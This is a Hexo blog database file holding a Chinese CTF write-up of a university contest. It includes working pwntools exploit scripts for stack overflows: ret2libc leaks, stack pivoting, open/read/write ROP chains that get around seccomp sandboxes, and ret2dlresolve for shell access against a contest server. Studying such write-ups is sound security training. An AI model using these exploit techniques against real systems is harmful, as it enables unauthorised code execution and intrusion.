{"meta":{"version":1,"warehouse":"5.0.0"},"models":{"Asset":[{"_id":"node_modules/hexo-theme-landscape/source/css/style.styl","path":"css/style.styl","modified":0,"renderable":1},{"_id":"node_modules/hexo-theme-landscape/source/js/script.js","path":"js/script.js","modified":0,"renderable":1},{"_id":"node_modules/hexo-theme-landscape/source/js/jquery-3.6.4.min.js","path":"js/jquery-3.6.4.min.js","modified":0,"renderable":1},{"_id":"node_modules/hexo-theme-landscape/source/fancybox/jquery.fancybox.min.js","path":"fancybox/jquery.fancybox.min.js","modified":0,"renderable":1},{"_id":"node_modules/hexo-theme-landscape/source/fancybox/jquery.fancybox.min.css","path":"fancybox/jquery.fancybox.min.css","modified":0,"renderable":1},{"_id":"node_modules/hexo-theme-landscape/source/css/images/banner.jpg","path":"css/images/banner.jpg","modified":0,"renderable":1}],"Cache":[{"_id":"source/_posts/hello-world.md","hash":"acad91ace80b80295b11a9b7ad4c29a2dcfdd8fb","modified":1699081388914},{"_id":"source/_posts/NEUQCSA-10月月赛题解.md","hash":"704aea790ed29a83c8b83e11c280e08f23d3c7c4","modified":1699081581482},{"_id":"node_modules/hexo-theme-landscape/languages/de-DE.yml","hash":"d29d1c4256b7ed9df42f511c2ff0a23ad5fd6c1f","modified":1699081429170},{"_id":"node_modules/hexo-theme-landscape/LICENSE","hash":"c480fce396b23997ee23cc535518ffaaf7f458f8","modified":1699081429036},{"_id":"node_modules/hexo-theme-landscape/languages/de.yml","hash":"3ebf0775abbee928c8d7bda943c191d166ded0d3","modified":1699081429171},{"_id":"node_modules/hexo-theme-landscape/package.json","hash":"4bf95d52f77edf811f23f6d264a7493311a8d078","modified":1699081429142},{"_id":"node_modules/hexo-theme-landscape/_config.yml","hash":"b608c1f1322760dce9805285a602a95832730a2e","modified":1699081429169},{"_id":"node_modules/hexo-theme-landscape/README.md","hash":"1a9b279e6dd29fd19245f913f0c4a316ffaa62db","modified":1699081429143},{"_id":"node_modules/hexo-theme-landscape/languages/en-GB.yml","hash":"ea5e6aee4cb14510793ac4593a3bddffe23e530c","modified":1699081429172},{"_id":"node_modules/hexo-theme-landscape/languages/en.yml","hash":"3083f319b352d21d80fc5e20113ddf27889c9d11","modified":1699081429173},{"_id":"node_modules/hexo-theme-landscape/languages/default.yml","hash":"ea5e6aee4cb14510793ac4593a3bddffe23e530c","modified":1699081429172},{"_id":"node_modules/hexo-theme-landscape/languages/en-US.yml","hash":"ea5e6aee4cb14510793ac4593a3bddffe23e530c","modified":1699081429173},{"_id":"node_modules/hexo-theme-landscape/languages/fr.yml","hash":"415e1c580ced8e4ce20b3b0aeedc3610341c76fb","modified":1699081429179},{"_id":"node_modules/hexo-theme-landscape/languages/es-ES.yml","hash":"7008a8fc91f18d2a735864817b8ebda30c7a2c66","modified":1699081429176},{"_id":"node_modules/hexo-theme-landscape/languages/fr-FR.yml","hash":"8d09dbdab00a30a2870b56f7c0a7ca7deafa7b88","modified":1699081429177},{"_id":"node_modules/hexo-theme-landscape/languages/es.yml","hash":"76edb1171b86532ef12cfd15f5f2c1ac3949f061","modified":1699081429177},{"_id":"node_modules/hexo-theme-landscape/languages/hu-HU.yml","hash":"712d18664898fa21ba38d4973e90ef41a324ea25","modified":1699081429181},{"_id":"node_modules/hexo-theme-landscape/languages/it-IT.yml","hash":"2cb6dc2fab9bd2dbe1c8bb869a9e8bf85a564fdd","modified":1699081429182},{"_id":"node_modules/hexo-theme-landscape/languages/ja-JP.yml","hash":"08481267e0c112e1f6855620f2837ec4c4a98bbd","modified":1699081429183},{"_id":"node_modules/hexo-theme-landscape/languages/it.yml","hash":"89b7d91306b2c1a0f3ac023b657bf974f798a1e8","modified":1699081429183},{"_id":"node_modules/hexo-theme-landscape/languages/hu.yml","hash":"284d557130bf54a74e7dcef9d42096130e4d9550","modified":1699081429181},{"_id":"node_modules/hexo-theme-landscape/languages/ja.yml","hash":"a73e1b9c80fd6e930e2628b393bfe3fb716a21a9","modified":1699081429184},{"_id":"node_modules/hexo-theme-landscape/languages/ko-KR.yml","hash":"19209ad8f9d4057e8df808937f950eb265e1db69","modified":1699081429185},{"_id":"node_modules/hexo-theme-landscape/languages/nl-NL.yml","hash":"5ebbc30021f05d99938f96dfff280392df7f91f0","modified":1699081429188},{"_id":"node_modules/hexo-theme-landscape/languages/mn-MN.yml","hash":"b9e5f3e7c0c2f779cf2cfded6db847b5941637ca","modified":1699081429186},{"_id":"node_modules/hexo-theme-landscape/languages/ko.yml","hash":"881d6a0a101706e0452af81c580218e0bfddd9cf","modified":1699081429186},{"_id":"node_modules/hexo-theme-landscape/languages/nl.yml","hash":"12ed59faba1fc4e8cdd1d42ab55ef518dde8039c","modified":1699081429188},{"_id":"node_modules/hexo-theme-landscape/languages/mn.yml","hash":"2e7523951072a9403ead3840ad823edd1084c116","modified":1699081429187},{"_id":"node_modules/hexo-theme-landscape/languages/pt.yml","hash":"57d07b75d434fbfc33b0ddb543021cb5f53318a8","modified":1699081429191},{"_id":"node_modules/hexo-theme-landscape/languages/no.yml","hash":"965a171e70347215ec726952e63f5b47930931ef","modified":1699081429189},{"_id":"node_modules/hexo-theme-landscape/languages/pt-PT.yml","hash":"0f852b6b228e6ea59aa3540574bb89b233f2a098","modified":1699081429190},{"_id":"node_modules/hexo-theme-landscape/languages/ru-RU.yml","hash":"360d11a28bb768afb1dd15f63fa7fd3a8cc547ee","modified":1699081429192},{"_id":"node_modules/hexo-theme-landscape/languages/th-TH.yml","hash":"ebfdba9bc4842c829473c1e6e4544344f182724d","modified":1699081429195},{"_id":"node_modules/hexo-theme-landscape/languages/th.yml","hash":"84a55b00aa01f03982be294e43c33a20e6d32862","modified":1699081429196},{"_id":"node_modules/hexo-theme-landscape/languages/ru.yml","hash":"4fda301bbd8b39f2c714e2c934eccc4b27c0a2b0","modified":1699081429195},{"_id":"node_modules/hexo-theme-landscape/languages/zh-CN.yml","hash":"1efd95774f401c80193eac6ee3f1794bfe93dc5a","modified":1699081429198},{"_id":"node_modules/hexo-theme-landscape/languages/tr.yml","hash":"a1cdbfa17682d7a971de8ab8588bf57c74224b5b","modified":1699081429197},{"_id":"node_modules/hexo-theme-landscape/layout/category.ejs","hash":"765426a9c8236828dc34759e604cc2c52292835a","modified":1699081429051},{"_id":"node_modules/hexo-theme-landscape/scripts/fancybox.js","hash":"c857d7a5e4a5d71c743a009c5932bf84229db428","modified":1699081429127},{"_id":"node_modules/hexo-theme-landscape/languages/zh-TW.yml","hash":"53ce3000c5f767759c7d2c4efcaa9049788599c3","modified":1699081429198},{"_id":"node_modules/hexo-theme-landscape/layout/layout.ejs","hash":"0d1765036e4874500e68256fedb7470e96eeb6ee","modified":1699081429062},{"_id":"node_modules/hexo-theme-landscape/layout/index.ejs","hash":"aa1b4456907bdb43e629be3931547e2d29ac58c8","modified":1699081429061},{"_id":"node_modules/hexo-theme-landscape/layout/page.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1699081429064},{"_id":"node_modules/hexo-theme-landscape/layout/archive.ejs","hash":"2703b07cc8ac64ae46d1d263f4653013c7e1666b","modified":1699081429048},{"_id":"node_modules/hexo-theme-landscape/layout/tag.ejs","hash":"eaa7b4ccb2ca7befb90142e4e68995fb1ea68b2e","modified":1699081429067},{"_id":"node_modules/hexo-theme-landscape/layout/post.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1699081429065},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/archive-post.ejs","hash":"c7a71425a946d05414c069ec91811b5c09a92c47","modified":1699081429043},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/after-footer.ejs","hash":"377d257d5d16e0158a4405c72401517b074fd7ff","modified":1699081429040},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/footer.ejs","hash":"3656eb692254346671abc03cb3ba1459829e0dce","modified":1699081429054},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/archive.ejs","hash":"7cb70a7a54f8c7ae49b10d1f37c0a9b74eab8826","modified":1699081429045},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/article.ejs","hash":"56597e951203dd662a6d2c817c7c4f1c920d4a25","modified":1699081429049},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/gauges-analytics.ejs","hash":"21a1e2a3907d1a3dad1cd0ab855fe6735f233c74","modified":1699081429055},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/google-analytics.ejs","hash":"2ea7442ea1e1a8ab4e41e26c563f58413b59a3d0","modified":1699081429056},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/head.ejs","hash":"f05bced793b0314d4f2ef0c993b3a51d0b7d203a","modified":1699081429057},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/header.ejs","hash":"6a5033d189554c9a6d42e2ef7952ae5c9742648e","modified":1699081429060},{"_id":"node_modules/hexo-theme-landscape/source/css/_extend.styl","hash":"222fbe6d222531d61c1ef0f868c90f747b1c2ced","modified":1699081429149},{"_id":"node_modules/hexo-theme-landscape/layout/_widget/archive.ejs","hash":"beb4a86fcc82a9bdda9289b59db5a1988918bec3","modified":1699081429047},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/sidebar.ejs","hash":"930da35cc2d447a92e5ee8f835735e6fd2232469","modified":1699081429066},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/mobile-nav.ejs","hash":"e952a532dfc583930a666b9d4479c32d4a84b44e","modified":1699081429062},{"_id":"node_modules/hexo-theme-landscape/source/css/_variables.styl","hash":"ca28281423ae57d76b6c1eb91cd845fd4e518bd6","modified":1699081429151},{"_id":"node_modules/hexo-theme-landscape/layout/_widget/category.ejs","hash":"dd1e5af3c6af3f5d6c85dfd5ca1766faed6a0b05","modified":1699081429051},{"_id":"node_modules/hexo-theme-landscape/layout/_widget/recent_posts.ejs","hash":"60c4b012dcc656438ff59997e60367e5a21ab746","modified":1699081429065},{"_id":"node_modules/hexo-theme-landscape/layout/_widget/tag.ejs","hash":"2de380865df9ab5f577f7d3bcadf44261eb5faae","modified":1699081429067},{"_id":"node_modules/hexo-theme-landscape/layout/_widget/tagcloud.ejs","hash":"b4a2079101643f63993dcdb32925c9b071763b46","modified":1699081429068},{"_id":"node_modules/hexo-theme-landscape/source/css/style.styl","hash":"e55a1d92954ed20f6887f92dc727bb995a010a43","modified":1699081429168},{"_id":"node_modules/hexo-theme-landscape/source/js/script.js","hash":"49773efcb2221bbdf2d86f3f5c5ff2d841b528cc","modified":1699081429140},{"_id":"node_modules/hexo-theme-landscape/source/fancybox/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1699081429038},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/date.ejs","hash":"f1458584b679545830b75bef2526e2f3eb931045","modified":1699081429052},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/category.ejs","hash":"c6bcd0e04271ffca81da25bcff5adf3d46f02fc0","modified":1699081429050},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/gallery.ejs","hash":"3d9d81a3c693ff2378ef06ddb6810254e509de5b","modified":1699081429055},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/tag.ejs","hash":"2fcb0bf9c8847a644167a27824c9bb19ac74dd14","modified":1699081429066},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/nav.ejs","hash":"16a904de7bceccbb36b4267565f2215704db2880","modified":1699081429063},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/archive.styl","hash":"db15f5677dc68f1730e82190bab69c24611ca292","modified":1699081429154},{"_id":"node_modules/hexo-theme-landscape/layout/_partial/post/title.ejs","hash":"4d7e62574ddf46de9b41605fe3140d77b5ddb26d","modified":1699081429069},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/comment.styl","hash":"79d280d8d203abb3bd933ca9b8e38c78ec684987","modified":1699081429156},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/article.styl","hash":"2d1f6f79ebf9cb55ebdb3865a2474437eb2b37c6","modified":1699081429155},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/footer.styl","hash":"e35a060b8512031048919709a8e7b1ec0e40bc1b","modified":1699081429157},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/header.styl","hash":"268d2989acb06e2ddd06cc36a6918c6cd865476b","modified":1699081429160},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/highlight.styl","hash":"9cc3b2927d814f2f6e8e188f9d3657b94f4c6ef3","modified":1699081429161},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/mobile.styl","hash":"a399cf9e1e1cec3e4269066e2948d7ae5854d745","modified":1699081429165},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/sidebar-aside.styl","hash":"890349df5145abf46ce7712010c89237900b3713","modified":1699081429165},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/sidebar.styl","hash":"404ec059dc674a48b9ab89cd83f258dec4dcb24d","modified":1699081429167},{"_id":"node_modules/hexo-theme-landscape/source/css/_partial/sidebar-bottom.styl","hash":"8fd4f30d319542babfd31f087ddbac550f000a8a","modified":1699081429166},{"_id":"node_modules/hexo-theme-landscape/source/css/_util/grid.styl","hash":"0bf55ee5d09f193e249083602ac5fcdb1e571aed","modified":1699081429159},{"_id":"node_modules/hexo-theme-landscape/source/css/_util/mixin.styl","hash":"44f32767d9fd3c1c08a60d91f181ee53c8f0dbb3","modified":1699081429164},{"_id":"node_modules/hexo-theme-landscape/source/js/jquery-3.6.4.min.js","hash":"eda46747c71d38a880bee44f9a439c3858bb8f99","modified":1699081429134},{"_id":"node_modules/hexo-theme-landscape/source/fancybox/jquery.fancybox.min.js","hash":"6181412e73966696d08e1e5b1243a572d0f22ba6","modified":1699081429139},{"_id":"node_modules/hexo-theme-landscape/source/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1699081429118},{"_id":"public/2023/11/04/hello-world/index.html","hash":"ac1ba326514cf5546467602aa93b677a2bb48109","modified":1699081600187},{"_id":"public/archives/2023/index.html","hash":"b46ac50dc09def84392bd97fa884bf620e3030d6","modified":1699081600187},{"_id":"public/archives/index.html","hash":"f1b30699a42ada1d5fd022c6e4e47705a9a961d3","modified":1699081600187},{"_id":"public/2023/11/04/NEUQCSA-10月月赛题解/index.html","hash":"58cc3e603805e9d5cfcec06b6b4fad1d32181ebe","modified":1699081600187},{"_id":"public/archives/2023/11/index.html","hash":"ac1355c4125b1bc3c522115bad6fa0557254a82c","modified":1699081600187},{"_id":"public/tags/Pwn/index.html","hash":"a3f7ca415c9e34a4aff47d0cc99624d1a5eefd29","modified":1699081600187},{"_id":"public/categories/NEUQCSA/index.html","hash":"422026b131a29299aa91becf974ba30b241c7c24","modified":1699081600187},{"_id":"public/index.html","hash":"1f8e231fcf88b1f38212c6535b8f3fc57f0fed89","modified":1699081600187},{"_id":"public/fancybox/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1699081600187},{"_id":"public/js/script.js","hash":"49773efcb2221bbdf2d86f3f5c5ff2d841b528cc","modified":1699081600187},{"_id":"public/css/style.css","hash":"ddb3792605d744ab3d9f0a649c82b62e9b16daa6","modified":1699081600187},{"_id":"public/js/jquery-3.6.4.min.js","hash":"eda46747c71d38a880bee44f9a439c3858bb8f99","modified":1699081600187},{"_id":"public/fancybox/jquery.fancybox.min.js","hash":"6181412e73966696d08e1e5b1243a572d0f22ba6","modified":1699081600187},{"_id":"public/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1699081600187}],"Category":[{"name":"NEUQCSA","_id":"clojpbdik0002z0ai9tgjhwtr"}],"Data":[],"Page":[],"Post":[{"title":"NEUQCSA-2023-10月赛题解","_content":"markdown出问题的话直接看链接：https://zcoi.github.io/blogs/CTF/monthgame2310/\n# 解题情况\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/web.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png)\n\n\n# 解题思路\n## Misc\n### level1-Login\n直接看html，发现base64加密的一串。直接解密就是flag\n\n\n\n## PWN\n### ret2libc\nQ:请嗯造libc\nA:我嗯造libc\n\n```\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\np=remote('8.130.110.158',2110)\n \nfunc_addr=elf.got['write']\nwrite_addr=elf.plt['write']\n \npop_rdi=0x4012a3\npop_rsi2=0x4012a1\nret=0x40101a\nvuln=0x4011db\n \npayload= b'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['write']\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\n \npause()\npayload=b'a'*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\n \np.interactive()\n \n# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x00000000004012a0 : pop r14 ; pop r15 ; ret\n# 0x00000000004012a2 : pop r15 ; ret\n# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040115d : pop rbp ; ret\n# 0x00000000004012a3 : pop rdi ; ret\n# 0x00000000004012a1 : pop rsi ; pop r15 ; ret\n# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n### Stack_Migration\n字面意思，栈可以到处跑\n正常审题程序不再罗列（checksec、IDA看字符串啥的）。\nIDA中发现有沙箱\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png)\n依旧是发现栈溢出。\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png)\n考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：\n```\nchar*file='flag';\nopen(file,0,0);\nread(3,file,0x30);\nwrite(1,file,0x30);\n```\n这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。\n```\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2109)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\n \nbss_st=0x4040A0\nbss_tar=0x4040A0+0x200\nflag_name=0x4040a0+0x200-8\nflag_addr=bss_st+0x300-0x40\n \npop_rdi=0x401373\npop_rsi2=0x401371\nleave=0x4012e6\n \nfunc_addr=elf.got['read']\nwrite_addr=elf.plt['write']\nread_addr=elf.plt['read']\nvuln=0x401279\n \npayload1=b'a'*(0x200-0x8)+b'flag\\x00\\x00\\x00\\x00'+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)\np.sendlineafter('everywhere',payload1)\n \nmigr_pay=b'a'*0x8+p64(bss_tar)+p64(leave)\np.sendafter('voice :',migr_pay)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['read']\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npause()\npayload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)\npayload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)\np.sendline(payload2)\n \nmigr_pay=b'a'*0x8+p64(bss_st)+p64(leave)\np.sendafter('voice :',migr_pay)\n \np.interactive()\n \n# 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401370 : pop r14 ; pop r15 ; ret\n# 0x0000000000401372 : pop r15 ; ret\n# 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401373 : pop rdi ; ret\n# 0x0000000000401371 : pop rsi ; pop r15 ; ret\n# 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040121a : ret 0xfffe\n \n# in libc\n# 0x0000000000142c92 : pop rdx ; ret\n# 0x000000000002601f : pop rsi ; ret\n```\n### call me sys\nsyscall，但是只能用几个函数\n又是沙箱：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png)\n还是栈溢出漏洞：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png)\n由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）\n```\nfrom pwn import*\n \ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2111)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\nfunc_addr=elf.got['setvbuf']\nsyscall_ret=0x4012ec\npop_rdi=0x401363\npop_rsi2=0x401361\n \np.sendline(\"000\")\npayload=b'a'*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)\npause()\np.sendline(payload)\np.recvuntil(b'./f1ag')\np.recv(2)\n# p.recvuntil(b'./f1ag\\x00\\x00\\x00')\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['setvbuf']\nprint(hex(func_addr))\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \nflag_name=0x4040e0\npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npop_rax=0x36174+base\n \npayload=b'flag\\x00\\x00\\x00\\x00'\npause()\np.send(payload)\n \npayload=b'a'*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)\npause()\np.send(payload)\n \np.interactive(0)\n \n# 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401360 : pop r14 ; pop r15 ; ret\n# 0x0000000000401362 : pop r15 ; ret\n# 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040119d : pop rbp ; ret\n# 0x0000000000401363 : pop rdi ; ret\n# 0x0000000000401361 : pop rsi ; pop r15 ; ret\n# 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040127e : ret 0x14\n# 0x00000000004012e7 : ret 0x200\n \n# 0x00000000004012ba : ret 0x4c\n# 0x000000000040129c : ret 0x50\n# offset in libc\n# 0x0000000000036174 : pop rax ; ret\n```\n\n### close\nQ:你leak不了一点！hacker！！\nA:？？？？？？\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png)\n既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。\n于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。\n于是考虑使用ret2dlresolve来调用shell。\n这里使用生成的payload\n原本是想用system(\"/bin/sh\")的，但是发现system好像有些神秘问题导致显示：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png)\n于是采用execve(\"/bin/sh\",0,0)来获取shell\n但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png)\n所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了\n之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1>&2\nhint:网上关于标准输出被关闭的情况，有教程：exec 1>&0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）\n```\nfrom pwn import *\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\ncontext.binary = elf = ELF(\"./pwn\")\nrop = ROP(context.binary)\ndlresolve = Ret2dlresolvePayload(elf,symbol=\"execve\",args=[\"/bin/sh\",0])\nrop.read(0,dlresolve.data_addr)\nrop.ret2dlresolve(dlresolve)\nraw_rop = rop.chain()\n# io = process(\"./pwn\")\n# io=process(['./ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":'./libc.so.6'})\n# io=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\nio=remote('8.130.110.158',7001)\n# gdb.attach(io)\npayload0 = flat({0x98:raw_rop})\nio.sendlineafter('name',\"fuck\")\npayload1=b'a'*0x90+p64(0x404e90)+p64(0x40127c)\nio.sendlineafter('response',payload1)\npause()\nio.sendline(dlresolve.payload.ljust(0x90,b'\\x00')+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got['alarm'])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])\n# pause()\n# io.sendline(dlresolve.payload)\n# io=remote('8.130.110.158',7001)\nio.sendline(b\"exec 1>&2\")\nio.sendline(b\"ls\")\nio.interactive()\n \n# 0x404e90\n# 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401320 : pop r14 ; pop r15 ; ret\n# 0x0000000000401322 : pop r15 ; ret\n# 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401323 : pop rdi ; ret\n# 0x0000000000401321 : pop rsi ; pop r15 ; ret\n# 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n","source":"_posts/NEUQCSA-10月月赛题解.md","raw":"---\ntitle: \"NEUQCSA-2023-10月赛题解\"\ncategories: NEUQCSA\ntag: Pwn\n---\nmarkdown出问题的话直接看链接：https://zcoi.github.io/blogs/CTF/monthgame2310/\n# 解题情况\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/web.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png)\n\n\n# 解题思路\n## Misc\n### level1-Login\n直接看html，发现base64加密的一串。直接解密就是flag\n\n\n\n## PWN\n### ret2libc\nQ:请嗯造libc\nA:我嗯造libc\n\n```\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\n# p=process('./pwn')\n# 